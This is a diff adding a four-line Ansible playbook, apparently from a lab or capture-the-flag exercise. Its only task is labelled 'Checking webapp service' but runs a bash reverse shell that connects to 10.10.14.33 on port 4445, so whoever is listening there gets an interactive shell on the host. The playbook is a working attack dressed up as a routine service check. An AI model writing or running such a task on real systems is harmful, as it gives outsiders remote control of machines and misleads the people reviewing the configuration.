@@ -1,0 +1,4 @@
+- hosts: localhost
+  tasks:
+  - name: Checking webapp service
+    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.33/4445 0>&1'
